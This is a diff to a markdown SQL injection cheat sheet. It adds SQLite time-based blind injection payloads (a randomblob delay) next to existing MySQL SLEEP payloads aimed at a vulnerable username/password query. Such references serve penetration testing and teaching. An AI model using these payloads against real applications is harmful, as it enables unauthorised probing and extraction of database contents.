@@ -71,12 +71,15 @@ __[In MsSQL, if second colums is `username` then the payload `' UNION SELECT 1,1
 
 ## Time-based Blind SQLI
   _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
-
+#### MySQLI
 *  _[$input_user]_ : `' OR (SELECT SLEEP(10) FROM table_name WHERE username='something') --`
 *  _[$input_user]_ : `' OR IF(username='something',SLEEP(10),0) --`
 
     [Produces a delayed response if username=`something` exists]
- 
+#### SQLite
+* _[$input_user]_ : `' OR CONDITION='true' AND 1=randomblob(100000000) --`
+
+    [Produces a delayed response if CONDITION='true']
 ## Common-errs
 * `mysql` does a case insensitive search by default and also ignores the trailing spaces
 
